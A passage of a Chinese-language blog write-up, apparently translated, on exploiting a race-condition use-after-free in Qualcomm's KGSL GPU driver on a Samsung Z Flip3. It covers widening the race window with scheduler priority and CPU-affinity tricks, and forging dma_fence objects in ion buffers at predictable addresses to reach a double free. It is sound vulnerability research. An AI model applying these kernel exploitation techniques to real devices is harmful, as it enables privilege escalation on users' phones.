class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    fence = kgsl_timelines_to_fence_array(device, param-&gt;timelines,</span><br><span class="line">        param-&gt;count, param-&gt;timelines_size,</span><br><span class="line">        (param-&gt;flags == KGSL_TIMELINE_WAIT_ANY));     <span class="comment">//&lt;------ dma_fence created and added to timeline</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (!timeout)</span><br><span class="line">        ret = dma_fence_is_signaled(fence) ? <span class="number">0</span> : -EBUSY;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = dma_fence_wait_timeout(fence, <span class="literal">true</span>, timeout);   <span class="comment">//&lt;----- 1.</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dma_fence_put(fence);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>kgsl_timelines_to_fence_array</code>创建<code>dma_fence</code>对象，并将其添加到<code>timeline</code>上。如果指定了一个 <code>timeout</code> ，那么该调用将进入<code>dma_fence_wait_timeout</code>（路径标记为1）进行等待，直到超时或线程收到中断。在<code>dma_fence_wait_timeout</code>结束后，<code>dma_fence_put</code>被调用，以将<code>dma_fence</code>的<code>refcount</code>减少到0，释放被添加到<code>timeline</code>上的<code>dma_fence</code>。</p>
<p>虽然<code>IOCTL_KGSL_TIMELINE_FENCE_GET</code>乍看之下似乎更容易使用和控制，但实际上，关闭<code>sync_file</code>产生的开销使得销毁<code>dma_fence</code>的时间不那么可靠。因此，对于这个bug，这里使用<code>IOCTL_KGSL_TIMELINE_FENCE_GET</code>来创建和添加持久化的<code>dma_fence</code>对象来填充<code>timeline-&gt;fences</code>列表，以扩大竞争窗口，而用于UAF漏洞的最后一个<code>dma_fence</code>对象是使用<code>IOCTL_KGSL_TIMELINE_WAIT</code>添加的，当发送中断信号给调用<code>IOCTL_KGSL_TIMELINE_WAIT</code>的线程，它就被释放。</p>
<h2 id="Widening-the-tiny-race-window"><a href="#Widening-the-tiny-race-window" class="headerlink" title="Widening the tiny race window"></a>Widening the tiny race window</h2><p>为了利用这个漏洞，需要在以下代码块中标记的第一个竞争窗口内删除<code>kgsl_timeline</code>的 <code>fences</code> 列表中的<code>dma_fence</code>的<code>refcount</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//BEGIN OF FIRST RACE WINDOW</span></span><br><span class="line">    spin_lock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node)</span><br><span class="line">        dma_fence_get(&amp;fence-&gt;base);</span><br><span class="line">    list_replace_init(&amp;timeline-&gt;fences, &amp;temp);</span><br><span class="line">    spin_unlock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    <span class="comment">//END OF FIRST RACE WINDOW</span></span><br><span class="line">    <span class="comment">//BEGIN OF SECOND RACE WINDOW</span></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    <span class="comment">//END OF SECOND RACE WINDOW</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如前所述，通过向<code>timeline-&gt;fences</code>添加大量的<code>dma_fence</code>对象，可以扩大第一个竞争窗口，这使得在这个窗口内很容易触发<code>refcount</code>的减少。然而，为了利用这个错误，下面的代码以及对象替换必须在第二个竞争窗口结束前完成：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_irqsave(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line">list_for_each_entry_safe(cur, temp, &amp;timeline-&gt;fences, node) &#123;</span><br><span class="line">    <span class="keyword">if</span> (f != cur)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    list_del_init(&amp;f-&gt;node);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irqrestore(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line">trace_kgsl_timeline_fence_release(f-&gt;timeline-&gt;id, fence-&gt;seqno);</span><br><span class="line">kgsl_timeline_put(f-&gt;timeline);</span><br><span class="line">dma_fence_free(fence);</span><br></pre></td></tr></table></figure>

<p>如前所述，由于<code>spin_lock</code>的存在，在第一个竞争窗口结束之前，上述代码不能执行，但在运行这段代码时，<code>timeline-&gt;fence</code>已经被清空，所以循环会很快运行。然而，由于<code>dma_fence_free</code>使用了<code>kfree_rcu</code>，实际释放<code>fence</code>的时间被推迟了。这使得我们不可能在第二个竞争窗口结束前替换已释放的<code>fence</code>，除非能操纵调度器。这里使用[Exploiting race conditions on (ancient) Linux](<a target="_blank" rel="noopener" href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019">https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019</a> - Exploiting race conditions on Linux.pdf)，另一个Android漏洞中也使用了这项<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/">技术</a>，以扩大这个竞争窗口。</p>
<p><strong>下面是关于这项技术的概述：</strong></p>
<p><strong>为了确保每个任务（线程或进程）有公平的CPU时间片，Linux内核调度程序可以中断一个正在运行的任务，并将其搁置，以便另一个任务可以运行。这种中断和停止任务的行为被称为抢占（被中断的任务被抢占）。一个任务也可以把自己搁置起来，让另一个任务运行，比如当它在等待一些I&#x2F;O输入时，或者当它调用<code>sched_yield()</code>时。在这种情况下，我们说该任务是自愿抢占的。抢占也可以发生在系统调用内部，比如<code>ioctl</code>调用，在Android上，除了一些关键区域（比如持有自旋锁），任务可以被抢占。这种行为可以通过使用CPU亲和力和任务优先级来操纵。</strong></p>
<p><strong>默认情况下，一个任务以<code>SCHED_NORMAL</code>的优先级运行，但也可以使用<code>sched_setscheduler</code>调用（或线程的<code>pthread_setschedparam</code>）设置一个较低的优先级<code>SCHED_IDLE</code>。此外，还可以用<code>sched_setaffinity</code>将其固定在一个CPU上，这将只允许它在一个特定的CPU上运行。通过将两个任务（一个具有<code>SCHED_NORMAL</code>优先级，另一个具有<code>SCHED_IDLE</code>优先级）固定在同一个CPU上，可以控制抢占的时间，如下所示：</strong></p>
<ol>
<li><strong>首先让<code>SCHED_NORMAL</code>任务执行一个系统调用，导致它暂停和等待。例如，它可以从一个没有数据进入的管道中读取数据，然后它将等待更多的数据，并主动抢占自己的位置，以便<code>SCHED_IDLE</code>任务可以运行。</strong></li>
<li><strong>当<code>SCHED_IDLE</code>任务正在运行时，向<code>SCHED_NORMAL</code>任务一直在等待的管道发送一些数据。这将唤醒<code>SCHED_NORMAL</code>任务，使其抢占<code>SCHED_IDLE</code>任务，由于任务的优先级，<code>SCHED_IDLE</code>任务将被抢占并搁置。</strong></li>
<li><strong>然后<code>SCHED_NORMAL</code>任务可以运行一个繁忙循环，以防止<code>SCHED_IDLE</code>任务被唤醒。</strong></li>
</ol>
<p>在这个bug的漏洞利用中，该技术使用如下所示：</p>
<ol>
<li><p>在一个线程上运行<code>IOCTL_KGSL_TIMELINE_WAIT</code>，向<code>kgsl_timeline</code>添加<code>dma_fence</code>对象。将超时设置为一个大值，并使用 <code>sched_setaffinity</code> 将这个任务固定在一个 CPU 上，称之为 <code>SPRAY_CPU</code>。一旦<code>dma_fence</code>对象被添加，这个任务就会变成空闲状态，直到它收到一个中断。</p>
</li>
<li><p>设置一个<code>SCHED_NORMAL</code>任务，并将其固定在另一个CPU上（<code>DESTROY_CPU</code>），该 CPU 监听一个空管道。这将导致这个任务最初变得空闲，并允许<code>DESTROY_CPU</code>运行一个低优先级的任务。一旦空管道收到一些数据，这个任务就会运行一个繁忙的循环。</p>
</li>
<li><p>在<code>DESTROY_CPU上</code>设置一个<code>SCHED_IDLE</code>任务，它将运行<code>IOCTL_KGSL_TIMELINE_DESTROY</code>来销毁步骤一中加入<code>dma_fence</code>的<code>timeline</code>。由于第二步中设置的任务正在等待空管的响应，<code>DESTROY_CPU</code>将首先运行这个任务。</p>
</li>
<li><p>向运行<code>IOCTL_KGSL_TIMELINE_WAIT</code>的任务发送一个中断。然后，在<code>IOCTL_KGSL_TIMELINE_DESTROY</code>在第一个竞争窗口内运行时，该任务将解除封锁并释放<code>dma_fence</code>。</p>
</li>
<li><p>写入<code>SCHED_NORMAL</code>任务正在监听的空管道。这将导致<code>SCHED_NORMAL</code>任务抢占<code>SCHED_IDLE</code>任务。一旦它成功地抢占了任务，<code>DESTROY_CPU</code>将运行繁忙循环，导致<code>SCHED_IDLE</code>任务被搁置。</p>
</li>
<li><p>由于运行<code>IOCTL_KGSL_TIMELINE_DESTROY</code>的<code>SCHED_IDLE</code>任务被搁置，现在有足够的时间来克服<code>kfree_rcu</code>引入的延迟，并允许步骤4中的<code>dma_fence</code>被释放和替换。之后，恢复<code>IOCTL_KGSL_TIMELINE_DESTROY</code>，这样后续的操作将在现在被释放和替换的<code>dma_fence</code>对象上执行。</p>
</li>
</ol>
<p>这里需要注意的是，因为在线程持有自旋锁的时候不能发生抢占，所以<code>IOCTL_KGSL_TIMELINE_DESTROY</code>只能在自旋锁之间的窗口期抢占，如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    spin_lock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node)</span><br><span class="line">      ...</span><br><span class="line">    spin_unlock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    <span class="comment">//Preemption window</span></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然上面的抢占窗口看起来非常小，但在实践中，只要<code>SCHED_NORMAL</code>任务试图在第一个自旋锁被持有时抢占运行<code>IOCTL_KGSL_TIMELINE_DESTROY</code>的<code>SCHED_IDLE</code>任务，一旦自旋锁被释放，抢占就会发生，这使得在正确的时间抢占<code>IOCTL_KGSL_TIMELINE_DESTROY</code>更容易成功。</p>
<p>下图红色块表示持有自旋锁的区域，因此不可能抢占，虚线表示闲置的任务：</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-2.webp" alt="Kernel-2"></p>
<p>对于对象的替换，使用<a target="_blank" rel="noopener" href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html"><code>sendmsg</code></a>，这是一种标准的方法，可以用受控数据替换linux内核中的已释放的对象。下面是假对象是如何被使用的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">    dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">    dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">    dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irq(&amp;timeline-&gt;lock);</span><br></pre></td></tr></table></figure>

<p>三个不同的函数，<code>dma_fence_set_error</code>、<code>dma_fence_signal_locked</code>和<code>dma_fence_put</code>将被调用，参数为<code>fence</code>。函数<code>dma_fence_set_error</code>将向<code>fence</code>对象写一个错误代码，这可能对合适的对象替换有用，但对<code>sendmsg</code>对象替换没有用，函数<code>dma_fence_signal_locked</code>如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dma_fence_signal_locked</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (unlikely(test_and_set_bit(DMA_FENCE_FLAG_SIGNALED_BIT,   <span class="comment">//&lt;-- 1.</span></span><br><span class="line">                      &amp;fence-&gt;flags)))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Stash the cb_list before replacing it with the timestamp */</span></span><br><span class="line">    list_replace(&amp;fence-&gt;cb_list, &amp;cb_list);                    <span class="comment">//&lt;-- 2.</span></span><br><span class="line">    ...</span><br><span class="line">    list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) &#123;        <span class="comment">//&lt;-- 3.</span></span><br><span class="line">        INIT_LIST_HEAD(&amp;cur-&gt;node);</span><br><span class="line">        cur-&gt;func(fence, cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先检查<code>fence-&gt;flags</code>（1）：如果<code>DMA_FENCE_FLAG_SIGNALED_BIT</code>标志被设置，那么<code>fence</code>已经被信号化，函数退出。如果<code>fence</code>没有被发出信号，那么会调用<code>list_replace</code>来移除<code>fence-&gt;cb_list</code>中的对象，并将其放入临时<code>cb_list</code>中（2） 之后，存储在<code>cb_list</code>中的函数被调用（3）。正如在 <code>kCFI </code>一节中解释的那样，因为<code>CFI</code>的缓解，这将只允许调用某种类型的函数；此外，在这个阶段，由于对函数地址一无所知，所以如果走到达这个路径，很可能只会让内核崩溃。所以，只能在假对象中设置<code>DMA_FENCE_FLAG_SIGNALED_BIT</code>标志，让<code>dma_fence_signal_locked</code>提前退出。</p>
<p>只剩下了、<code>dma_fence_put</code>函数，它减少<code>fence</code>的<code>refcount</code>，并在<code>refcount</code>达到0时调用<code>dma_fence_release</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dma_fence_release</span><span class="params">(<span class="keyword">struct</span> kref *kref)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fence-&gt;ops-&gt;release)</span><br><span class="line">        fence-&gt;ops-&gt;release(fence);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dma_fence_free(fence);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果调用<code>dma_fence_release</code>，那么最终会检查<code>fence-&gt;ops</code>并调用<code>fence-&gt;ops-&gt;release</code>。这就有两个问题。首先，<code>fence-&gt;ops</code>需要指向有效的内存，否则解除引用就会失败，即使解除引用成功，<code>fence-&gt;ops-&gt;release</code>要么需要为零，要么必须是一个适当类型的函数的地址。</p>
<p>所有这些给了两个选择。可以遵循标准路径：尝试用另一个对象替换栅栏对象，或者尝试利用<code>dma_fence_put</code>和<code>dma_fence_set_error</code>提供的有限的写原语，同时希望仍然可以控制<code>flags</code>和<code>refcount</code>字段以避免<code>dma_fence_signal_locked</code>或<code>dma_fence_release</code>使内核崩溃。</p>
<h2 id="The-ultimate-fake-object-store"><a href="#The-ultimate-fake-object-store" class="headerlink" title="The ultimate fake object store"></a>The ultimate fake object store</h2><p>在利用另一个<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/">错误</a>时，作者发现了软件输入输出转换旁观缓冲区（<code>SWIOTLB</code>），这是一个在启动时很早就分配的内存区域。因此，<code>SWIOTLB</code>的物理地址是非常固定的，只取决于硬件配置。此外，由于该内存位于 “低内存 “区域（Android设备似乎没有 “高内存 “区域），并且不在内核镜像中，因此虚拟地址只是带有固定偏移的物理地址（对细节感兴趣的读者可以关注<code>kmap</code>函数的实现）:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __virt_to_phys_nodebug(x) (&#123;                   \</span></span><br><span class="line"><span class="meta">    phys_addr_t __x = (phys_addr_t)(__tag_reset(x));        \</span></span><br><span class="line"><span class="meta">    __is_lm_address(__x) ? __lm_to_phys(__x) : __kimg_to_phys(__x); \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __is_lm_address(addr)  (!(((u64)addr) &amp; BIT(vabits_actual - 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __lm_to_phys(addr) (((addr) + physvirt_offset))</span></span><br></pre></td></tr></table></figure>

<p>上述定义来自<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/include/asm/memory.h"><code>arch/arm64/include/asm/memory.h</code></a>，它是Android的相关实现。用于翻译地址的变量<code>physvirt_offset</code>是在<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/mm/init.c#L517"><code>arm64_memblock_init</code></a>中设置的一个固定常数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">arm64_memblock_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;...</span><br><span class="line">    memstart_addr = round_down(memblock_start_of_DRAM(),</span><br><span class="line">                   ARM64_MEMSTART_ALIGN);</span><br><span class="line">    physvirt_offset = PHYS_OFFSET - PAGE_OFFSET;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除此之外，<code>SWIOTLB</code>中的内存可以通过<code>adsp</code>驱动访问，而<code>adsp</code>驱动是可以从一个不受信任的应用程序中到达的，所以这似乎是一个存储假对象和重定向假指针的好地方。然而，在5.x版本的内核中，<code>SWIOTLB</code>只有在用<code>CONFIG_DMA_ZONE32</code>标志编译内核时才会被分配，而Z Flip3 不是这种情况。</p>
<p>然而，还有更好的东西。<code>SWIOTLB</code>的早期分配给了它一个可预测的地址，这促使作者检查启动日志，看看是否有其他的内存区域在启动过程中被提前分配，结果发现确实有其他的内存区域在启动过程中被很早地分配。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  Reserved memory: created CMA memory pool at 0x00000000f2800000, size 212 MiB</span><br><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  OF: reserved mem: initialized node secure_display_region, compatible <span class="built_in">id</span> shared-dma-pool</span><br><span class="line">...</span><br><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  OF: reserved mem: initialized node user_contig_region, compatible <span class="built_in">id</span> shared-dma-pool</span><br><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  Reserved memory: created CMA memory pool at 0x00000000f0c00000, size 12 MiB</span><br><span class="line"></span><br><span class="line">&lt;6&gt;[    0.578613] [7:      swapper/0:    1]  platform soc:qcom,ion:qcom,ion-heap@22: assigned reserved memory node sdsp_region</span><br><span class="line">...</span><br><span class="line">&lt;6&gt;[    0.578829] [7:      swapper/0:    1]  platform soc:qcom,ion:qcom,ion-heap@26: assigned reserved memory node user_contig_region</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>上面的保留内存区域似乎是用于分配<code>ion</code>缓冲区的内存池。</p>
<p>在Android上，<code>ion_allocator</code>被用来分配用于<code>DMA</code>（直接内存访问）的内存区域，允许内核驱动和用户空间进程共享同一底层内存。未受信任的应用程序可以通过<code>/dev/ion</code>文件访问<code>ion</code>分配器，<code>ION_IOC_ALLOC</code> <code>ioctl</code>可以用来分配一个<code>ion</code>缓冲区。该<code>ioctl</code>向用户返回一个新的文件描述符，然后可以在<code>mmap syscall</code>中使用，将<code>ion</code>缓冲区的后备存储映射到用户空间。</p>
<p>使用<code>ion</code>缓冲区的一个特殊原因是，用户可以请求具有连续物理地址的内存。这一点特别重要，因为有些设备（如硬件上的设备，而不是手机本身）直接访问物理内存，拥有连续的内存地址可以大大改善这种内存访问的性能，而有些设备不能处理非连续的物理内存。</p>
<p>与<code>SWIOTLB</code>类似，为了确保具有请求大小的连续物理内存区域可用，<code>ion</code>驱动在启动初期就分配了这些内存区域，并将其作为内存池（”划出的区域”），然后在以后的请求中用于分配<code>ion</code>缓冲区。并非<code>ion</code>设备中的所有内存池都是连续的内存（例如，通用的 “系统堆 “可能不是物理上连续的区域），但是用户可以在使用<code>ION_IOC_ALLOC</code>时指定<code>heap_id_mask</code>来指定具有特定属性（例如，连续的物理内存）的<code>ion</code>堆。</p>
<p>这些内存池在如此早的阶段被分配，意味着它们的地址是可预测的，只取决于硬件的配置（设备树、可用内存、内存起始地址、各种启动参数等）。这尤其意味着，如果使用<code>ION_IOC_ALLOC</code>从一个很少使用的内存池中分配一个<code>ion</code>缓冲区，这个缓冲区很可能被分配到一个可预测的地址。如果使用<code>mmap</code>将缓冲区映射到用户空间，就可以在任何时候访问这个可预测地址的内存了。</p>
<p>经过一些实验，似乎<code>user_contig_region</code>几乎从未被使用，每次都能把整个区域映射到用户空间。所以在这个漏洞中，作者使用了这个内存池，并假设可以分配整个区域以保持简单。(在不影响可靠性的情况下，修改漏洞以适应部分区域不可用的情况是很容易的)。</p>
<p>现在能够把受控的数据放在一个可预测的地址上，可以解决之前在利用中遇到的问题。回顾一下，当<code>dma_fence_release</code>在假 <code>fence</code> 对象上被调用时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dma_fence_release</span><span class="params">(<span class="keyword">struct</span> kref *kref)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fence-&gt;ops-&gt;release)</span><br><span class="line">        fence-&gt;ops-&gt;release(fence);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dma_fence_free(fence);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有一个问题，需要<code>fence-&gt;ops</code>指向一个包含所有零的有效地址，这样<code>fence-&gt;ops-&gt;release</code>就不会被调用（因为在这个阶段没有一个有效的函数地址与<code>fence-&gt;ops-&gt;release</code>的签名相匹配，走这个路径会使内核崩溃）。</p>
<p>由于<code>ion</code>缓冲区在一个可预测的地址上，可以简单地把它填为零，让<code>fence-&gt;ops</code>指向那里。这将确保<code>dma_fence_free</code>路径被采取，然后释放假对象，形成一个<code>double free</code>的原形，同时防止内核崩溃。在继续利用这个<code>double free</code>原语之前，还有一个问题需要首先解决。</p>
<h2 id="Escaping-an-infinite-loop"><a href="#Escaping-an-infinite-loop" class="headerlink" title="Escaping an infinite loop"></a>Escaping an infinite loop</h2><p>回顾一下，在<code>kgsl_ioctl_timeline_destroy</code>函数中，在<code>fence</code>对象被销毁和替换后，会执行以下循环：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">    dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">    dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">    dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irq(&amp;timeline-&gt;lock);</span><br></pre></td></tr></table></figure>

<p><code>list_for_each_entry_safe</code> 将首先从 <code>list_head</code> <code>temp</code> 中获取下一个指针，找到列表中的第一个<code>fence</code>条目，然后通过跟踪 <code>fence-&gt;node</code> 中的下一个指针进行迭代，直到下一个条目再次指向 <code>temp</code>。如果下一个条目没有指向<code>temp</code>，那么这个循环就会继续。这是一个变量初始化使利用更加困难的地方。看看<code>kgsl_timeline_fence</code>的结构，它嵌入了一个<code>dma_fence</code>对象，被添加到<code>kgsl_timeline</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kgsl_timeline_fence</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_fence</span> <span class="title">base</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kgsl_timeline</span> *<span class="title">timeline</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">node</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>node</code>字段是<code>kgsl_timeline_fence</code>中的最后一个字段，而为了构建这个漏洞，只需要用受控数据替换<code>base</code>。如果用部分对象替换，上述问题就会很容易解决了。在没有自动变量初始化的情况下，如果只将释放的<code>kgsl_timeline_fence</code>替换成一个<code>dma_fence</code>大小的对象，那么字段<code>timeline</code>和<code>node</code>将保持不变，并包含有效数据。这将导致<code>node</code>中的下一个指针有效，并允许<code>kgsl_ioctl_timeline_destroy</code>的循环正常退出。然而，在自动变量初始化的情况下，即使把释放的<code>kgsl_timeline_fence</code>对象换成一个更小的对象，整个内存块也会首先被设置为零，抹去<code>kgsl_timeline</code>和<code>node</code>，这意味着必须伪造<code>node</code>字段，以便：</p>
<ol>
<li>下一个指针指向一个有效的地址，以避免立即崩溃，事实上，不止如此，它需要指向一个对象，这个对象是另一个假的<code>kgsl_timeline_fence</code>，可以被循环中的函数（<code>dma_fence_set_error</code>、<code>dma_fence_signal_locked</code>和<code>dma_fence_put</code>）操作而不崩溃。这意味着需要制作更多的假对象。</li>
<li>这些假的<code>kgsl_timeline_fence</code>对象中的一个下一个指针指向了退出循环的<code>temp</code>列表，这是一个堆栈分配的变量。</li>
</ol>
<p>第一个要求并不难，因为现在可以使用<code>ion</code>缓冲器来创建这些假的<code>kgsl_timeline_fence</code>对象。然而，第二个要求则要难得多：</p>
